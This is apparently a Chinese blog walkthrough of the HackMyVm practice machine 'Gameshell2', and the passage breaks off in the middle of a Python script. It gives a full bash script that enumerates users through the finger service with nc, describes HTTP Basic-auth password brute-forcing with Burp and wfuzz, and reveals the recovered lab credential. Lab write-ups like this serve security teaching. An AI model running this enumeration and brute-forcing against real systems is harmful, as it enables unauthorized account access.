---
title: HackMyVm靶场之Gameshell2
url: https://mp.weixin.qq.com/s/RPRIgxby1CaPep7lln5RrA
source: Doonsec's feed
date: 2026-01-09
fetch_date: 2026-01-10T03:25:12.820000
---

# HackMyVm靶场之Gameshell2

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6b6fTw91rjFx8PJtaoo3yYPHE675dZFOibgXjGfmNuCr2AvRXZsjrTianQ/0?wx_fmt=jpeg)

# HackMyVm靶场之Gameshell2

原创

MS02423

MS02423

![]()

在小说阅读器中沉浸阅读

这个靶场考了一个79端口的应用，也就是finger服务，还有就是HTTP认证爆破，我们可以使用bp或者是wfuzz进行爆破密码(base64加密)，最后是一个phpsploit工具的使用

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6b8aLia2aNjMeNEQffycBg7Ciaq0Ob81cFFctb60a9rorLDLT2QYaF7hiaA/640?wx_fmt=png&from=appmsg)

1.探测IP

```
nmap -sP 192.168.137.0/24
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bjoP1iaUIickXSUDeibkx88L4B5gChnB2I8IkDUUTfwRkxQHdicWt4Ds0yw/640?wx_fmt=png&from=appmsg)

靶场IP是192.168.137.56

2.扫描IP

1)扫描端口

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bE4ib3KuaCvQe1LWty0P38F8hQVovJYnViaZYegTvibVG9mVSB0GwFvnIQ/640?wx_fmt=png&from=appmsg)

端口开放了22 79 80 ，那么我们的思路就是在79和80端口找到信息然后在22端口登录，这里我们首先知道79端口的服务finger是什么

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bibwmTbb0icLPYKL3VrMic4NhCOBm9JeicZiarfXPujaYoFyClYvrygBvqMw/640?wx_fmt=png&from=appmsg)

那么我们可以使用finger去查询靶场里面的用户有哪些，然后去爆破密码(大概的思路就是这样的，实际情况我们需要结合靶机去做的)

2)扫描服务

```
gobuster dir -u http://192.168.137.56  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt   -x php,txt,html,zip
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bcicUANhnibdBaO1gKHkx8Jkjdd0rYY4k75KdQRT547d5zbWJX9FRUvNw/640?wx_fmt=png&from=appmsg)

我们有用的目录就是users.html和terminal,user.html是一个用户名字典，我们需要使用finger去爆破，而terminal是一个登录页面，我们需要通过爆破用户名和密码去登录的。

3.访问IP

```
http://192.168.137.56/
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bd4kdTXh88G8RBqhZVozqb95GsvBicl9NyUhYDJ3c70GxlIjZWZXQX4A/640?wx_fmt=png&from=appmsg)

没有任何的信息

4.渗透测试

目前我们掌握的信息只有一个用户名字典和一个登录页面，那么我们的思路就是去爆破用户名

```
http://192.168.137.56/users.html
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bEx1yvy9lBznlEv2icxibg0tpeHFu5ne8Q9iaAH7XrerOq4iaWzjIr5Of8g/640?wx_fmt=png&from=appmsg)

```
http://192.168.137.56/terminal
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bNzf020vicrAvicNQ62ibicBN75NBCLFTBia1SO3AY9m2XkTMvaBC05xibhDA/640?wx_fmt=png&from=appmsg)

爆破用户名

我们使用finger去写一个脚本，看看用户名是什么，我们使用sh脚本去爆破

1)整理用户名字典

我们使用curl将字典写入users.txt文件里面

```
curl http://192.168.137.56/users.html > users.txt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6b3loNRLcay0jkiaYRLMfBn3OOoW4Ox8CYoVK5BdicncF4piaibSWNH0UCQA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bfWfwvDEZPbwfhgicJQ0qRODB6joibfbgNiaFPwDnYW00ppdwicWRe5w1FA/640?wx_fmt=png&from=appmsg)

用户名字典最后提示我们密码是top1000，那么我们猜测密码应该是在rockyou.txt字典里面的前1000个里面

2)使用脚本爆破用户名

我们使用脚本爆破用户名，字典我们就选择users.txt

脚本内容如下:

```
#!/bin/bash
# ================ 配置区域 ================TARGET="192.168.137.56"# 你的字典路径WORDLIST="users.txt"OUTPUT="res.txt"DELAY=0.5  # =========================================
echo "[*] 启动 Finger 用户枚举 (Target: $TARGET)"echo "[*] 过滤条件：忽略包含 'no such user' 的响应"echo "[*] 扫描速率：2 次/秒 (${DELAY}s interval)"  echo "[*] 结果保存：$OUTPUT"echo "-----------------------------------------"
# 清空/新建输出文件> "$OUTPUT"
# 检查字典是否存在if [ ! -f "$WORDLIST" ]; then    echo "[!] 错误：找不到字典文件 $WORDLIST"    exit 1fi
# 读取字典cat "$WORDLIST" | while read user; do    # 去除两端空白符并跳过空行    user=$(echo "$user" | xargs)    if [ -z "$user" ]; then        continue    fi
    # 1. echo -e "$user\r\n" 生成标准\r\n结尾的请求    # 2. nc -q 1 -w 2 关闭冗余输出、延长超时    # 3. 2>/dev/null 屏蔽nc错误输出，避免干扰    response=$(echo -e "$user\r\n" | nc -q 1 -w 2 "$TARGET" 79 2>/dev/null)
      sleep $DELAY
    # ==== 核心逻辑判断 ====    # 1. 如果结果为空，跳过    if [ -z "$response" ]; then        echo -ne "[-] $user (无响应) \r"        continue    fi
    # 2. 如果包含 "no such user"，明确判定为不存在，跳过    if echo "$response" | grep -qi "no such user"; then        echo -ne "[-] $user (不存在) \r"        continue    fi
       if echo "$response" | grep -qEi "User:|Login:|Dir:|Directory:|Shell:|Plan:|Name:"; then        echo -e "\n\033[32m[+] 发现有效用户: $user \033[0m"
        # 写入文件        echo "=====================================" >> "$OUTPUT"        echo "Username: $user" >> "$OUTPUT"        echo "$response" >> "$OUTPUT"
        # 检查是否有 Plan 或者是 "No Plan"        if echo "$response" | grep -qi "No Plan"; then            echo "    -> (No Plan)"        else            # 如果没有 'No Plan' 字样，但有 Plan 字段，说明可能有秘密信息            echo -e "    -> \033[31m[!] 可能包含敏感信息 (Has Plan)!\033[0m"        fi        echo "-------------------------------------"    else        # 既不是 "no such user" 也没有特征词，可能是连接错误或垃圾数据        echo -ne "[-] $user (未知响应) \r"        # 可选：取消注释查看未知响应详情，方便调试        # echo "未知响应-[$user]: $response" >> debug.log    fidone
echo -e "\n\n[*] 扫描完成，有效结果已保存至 $OUTPUT"
```

我们可以看到爆破出来2个用户名，我们去查看res.txt文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bypR7dGKrSS2CoyAOKkGol9RUgwQ06y4vYEUibdetCJJ0p7nlTMfKehw/640?wx_fmt=png&from=appmsg)

可以看到dt用户名是在/home/目录下的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bUheKLNhX5udZia2Dib4iasTXGliaAt7ics0zvSUcic1rQQ6knWmjHPibCicM0Q/640?wx_fmt=png&from=appmsg)

最后我们确定用户名就是dt

爆破密码

1)抓包

这里我们有2个方法，第一个使用bp爆破

首先，我们去使用用户名dt去登录，密码我们输入123456，我们抓包看看

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bHtTO5thqM7V2NcKvwunNlk30uP6DibBQ3fyv7HFW5fGriasyfGsHiaBvw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bzq7BAjuDJicMYC6UV5OfibWjPUUslQqtAPcU8MyM66959iaa1PAL4uToA/640?wx_fmt=png&from=appmsg)

```
Authorization: Basic ZHQ6MTIzNDU2
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bR2dwDibA47oMcjoPiaVvPTrjuqWdWdHGo1UGQnZiazdejpEyoOjsZhvdA/640?wx_fmt=png&from=appmsg)

我们可以看到Authorization和状态码401，我们知道是Basic认证是HTTP 中非常简单的认证方式，只使用了Base64加密方式

2)整理密码字典

告诉我们密码是前1000,那么我们整理出rocoyou.txt前1000的数据

```
head -n 1000 rockyou.txt > ms02423.txt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bSd7z5TYfPhlGUfcyv6oaCB1ZXibhnHGHOROryiaWnvwHGSmCCniaITHQw/640?wx_fmt=png&from=appmsg)

3)爆破密码

这里我是知道密码的，所以我就写了8个密码然后去密码，如果我使用1000个密码去爆破的话，可能需要爆破1,2个小时(我的电脑性能不行了，如果爆破的话可能会炸的![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/Broken.png)

爆破类型

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bAIwRPicKM0q6TbcDSEnjqPNK1CgclwZQR2FyZEzrudrG7a0HibyhhjxQ/640?wx_fmt=png&from=appmsg)

用户名

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6b8I8O4HKVNxs33kgD1NZP1gAeic8ibfEhj720YTosmBqUknbuNI7EsyGw/640?wx_fmt=png&from=appmsg)

用户名:密码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bz8G0ibbr124PbCZyZtzibxyRV6mjeJJL3jKibht7lZhjGcCJCiasVa9MHQ/640?wx_fmt=png&from=appmsg)

密码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bq45J1LrmmuWELiaH8UqSpcErR9LKlFA4B4xtibcibMWANTftdib0BcooyA/640?wx_fmt=png&from=appmsg)

base64加密

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6baxu9DywZFkjsWaIdUQ1WwnYHqmo75nNuabiaYUafADVtkBa4JagbAFw/640?wx_fmt=png&from=appmsg)

攻击

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bp8o0beibv2REexJOTHzua9zLVQOLoEE1bIgPfIzWWlRYT7IoEztuT6g/640?wx_fmt=png&from=appmsg)

我们可以看到有一个状态码是200，我们进行查看

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bsW1BQZIP968gd4gkGmaENSuv1me8iaVzWxMWffZT04BmgUmdB082bqA/640?wx_fmt=png&from=appmsg)

ZHQ6cHVycGxlMQ%3d%3d

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8RWviaSOiaicEliawn0Joj7or6bbSqtgiachjru95YVpxD2RTmYd1yoDia2zIapGib7IO8vAUZpGp93agMcg/640?wx_fmt=png&from=appmsg)

我们可以看到密码是purple1

我们使用另一个工具wfuzz去爆破，在爆破之前，我们需要将密码字典进行base64加密的，我们指定用户名是dt，密码是1000个数据，然后去把用户名和密码base64解密，生成一个新的字典，我们使用新的字典去爆破即可

脚本如下

```
import base64
username = "dt"          # 指定用户名input_file = '/home/kali/桌面/rockyou.txt'     # 原始密码字典output_file = "output.txt"  # 生成的新字典
with open(i...